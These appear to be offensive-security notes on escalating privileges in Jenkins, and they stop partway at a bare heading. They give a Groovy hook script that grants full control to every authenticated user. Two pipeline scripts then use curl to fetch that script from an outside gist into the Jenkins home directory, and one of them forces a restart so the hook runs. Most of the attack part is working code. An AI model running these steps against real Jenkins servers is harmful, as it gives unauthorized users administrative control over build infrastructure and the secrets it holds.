# Privilege Escalations
- When new users are created they by default has admin access
- The users can be given specific roles using the Authorization Matrix Plugin
- The attacks we can try is to 




## Give admin access to all authenticated users by executing a groovy script - Technique 1

- The 1st condition for this attack is that the build has to run on the Built-In node , i.e on the Controller.
- The 2nd condition is Jenkins would need a restart after this attack.
- We need to write a init.groovy script that will give the authenticated users admin access 
- We will write a pipeline script to download that init.grooy script that will be replaced in the JENKINS_HOME location.
- init.groovy script will run after the Jenkins initialization, hence a Jenkins reboot is required.
- We will wait for a restart and our low privileged user will have admin access.

init.groovy
``` Groovy
//code copied from http://tdongsi.github.io/blog/2017/12/30/groovy-hook-script-and-jenkins-configuration-as-code/
import jenkins.model.*
def instance = Jenkins.getInstance()

import hudson.security.*
def realm = new HudsonPrivateSecurityRealm(false)
instance.setSecurityRealm(realm)

def strategy = new hudson.security.FullControlOnceLoggedInAuthorizationStrategy()
strategy.setAllowAnonymousRead(false)
instance.setAuthorizationStrategy(strategy)

instance.save()
```

pipeline
``` Jenkinsfile
pipeline {
    agent any
    stages {
        stage('Copy Groovy Script to JENKINS_HOME') {
            steps {
                sh '''
                    curl -o /var/lib/jenkins/init.groovy https://gist.githubusercontent.com/dibsy/c42f536d12a406cbd3845aea4f6ac746/raw/476980613a3f23af11bc958f8a03fc40689987ff/HOOK.groovy
                  '''
            }
        }         
    }
}
```


## Give admin access to all authenticated users by executing a groovy script - Technique 2


```
pipeline {
    agent any
    
    stages {
        stage('Copy Groovy Script to JENKINS_HOME') {
            steps {
                sh '''
                    curl -o init.groovy https://gist.githubusercontent.com/dibsy/c42f536d12a406cbd3845aea4f6ac746/raw/b1240be7e950a96929810e5fafbdd76db46a9731/HOOK.groovy
                  '''
            }
        }
        stage('Restart Jenkins') {
            steps {
                script {
                    Jenkins.instance.restart()
                }
            }
        }        
    }
}
```



## Give extra permissions to user by modifying the config.xml file
